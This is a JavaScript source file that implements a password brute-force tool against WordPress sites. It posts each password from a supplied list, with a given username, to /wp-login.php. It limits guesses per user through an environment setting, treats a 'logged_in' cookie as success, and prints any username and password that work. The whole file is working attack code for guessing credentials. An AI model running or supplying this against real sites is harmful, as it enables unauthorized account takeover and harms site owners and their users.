const axios_config = require('./config/axios_config.js');
const chalk = require('chalk');
const qs = require('qs');

const max_guesses_per_user = process.env.MAX_GUESSES_PER_USER;

async function doLogin(url, method, login, passwords) {
    let client = axios_config.getClient();

    let loginEndpoint = url + '/wp-login.php';

    let g = 0;
    for (i = 0; i < passwords.length; i++) {
        if (g == max_guesses_per_user) break;

        let password = passwords[i];

        let data = qs.stringify({
            'log': login,
            'pwd': password 
        });

        try {

            let config = {
                method: method,
                url: loginEndpoint,
                data: data,
                headers: axios_config.getLoginHeaders()
            };

            const response = await client(config);

            if (response && response.status === 200) {
                let cookies = response.headers['set-cookie'];

                if (cookies && cookies.toString().includes('logged_in')) {
                    console.info(chalk.green(`${url} : successfully logged in,  login - ${login}, password - ${password}`));
                    break;
                }
            } else if (response && response.status != 200) {
                console.warn(chalk.yellow(`${url} : status - ${response.status}, response - ${response.data}`));
            }

        } catch (error) {
            console.error(chalk.red(`${url} : unexpected error, login - ${login}, password - ${password}, message - ${error}`));
        }

        g++;
    }
}

module.exports.doLogin = doLogin;
